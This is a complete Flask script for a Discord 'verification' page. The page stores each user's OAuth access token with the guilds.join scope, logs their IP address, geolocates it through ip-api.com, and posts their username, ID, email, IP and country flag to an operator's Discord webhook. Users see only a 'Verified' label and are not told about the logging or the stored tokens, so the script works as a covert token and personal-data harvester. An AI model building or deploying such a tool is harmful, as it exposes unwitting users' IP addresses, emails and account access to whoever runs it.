from flask import Flask, redirect, request, render_template
import requests
import sqlite3
import json

app = Flask(__name__)

DISCORD_WEBHOOK_URL = '' # Webhook for log
CLIENT_ID = '' # Your bot Client ID
CLIENT_SECRET = '' # Your bot Client Secret
REDIRECT_URI = 'http://<IP>:<PORT>/callback'

conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, access_token TEXT)''')

@app.route('/login')
def login():
    return redirect(
        f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join%20email"
    )

@app.route('/callback')
def callback():
    code = request.args.get('code')
    token_response = exchange_code(code)
    access_token = token_response['access_token']
    user_id = get_user_id(access_token)
    save_user(user_id, access_token)
    
    user_ip = request.remote_addr
    country_flag = get_country_flag(user_ip)
    user_info = get_user_info(access_token)
    send_discord_webhook(user_info, user_ip, country_flag)
    
    return render_template('index.html')

def exchange_code(code):
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post('https://discord.com/api/oauth2/token', data=data, headers=headers)
    response.raise_for_status()
    return response.json()

def get_user_id(access_token):
    headers = {'Authorization': f'Bearer {access_token}'}
    response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    response.raise_for_status()
    return response.json()['id']

def save_user(user_id, access_token):
    c.execute('INSERT OR REPLACE INTO users (user_id, access_token) VALUES (?, ?)', (user_id, access_token))
    conn.commit()

def get_user_info(access_token):
    headers = {'Authorization': f'Bearer {access_token}'}
    response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    response.raise_for_status()
    user_info = response.json()

    email_response = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    email_response.raise_for_status()
    user_info['email'] = email_response.json().get('email', '')
    
    return user_info

def get_country_flag(ip_address):
    response = requests.get(f'http://ip-api.com/json/{ip_address}')
    response.raise_for_status()
    country_code = response.json().get('countryCode', '')
    return f':flag_{country_code.lower()}:' if country_code else ':question:'

def send_discord_webhook(user_info, ip_address, country_flag):
    avatar_url = f'https://cdn.discordapp.com/avatars/{user_info["id"]}/{user_info["avatar"]}.png'
    payload = {
        'embeds': [
            {
                'title': 'Verified ✅',
                'description': f'**Username: {user_info["username"]}\nID: {user_info["id"]}\nEmail: {user_info["email"]}\nIP Address: {ip_address}\nCountry: {country_flag}**',
                'thumbnail': {
                    'url': avatar_url
                }
            }
        ]
    }
    headers = {'Content-Type': 'application/json'}
    response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(payload), headers=headers)
    response.raise_for_status()

if __name__ == '__main__':
    print(f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join%20email")
    app.run(host='0.0.0.0', port=5000)
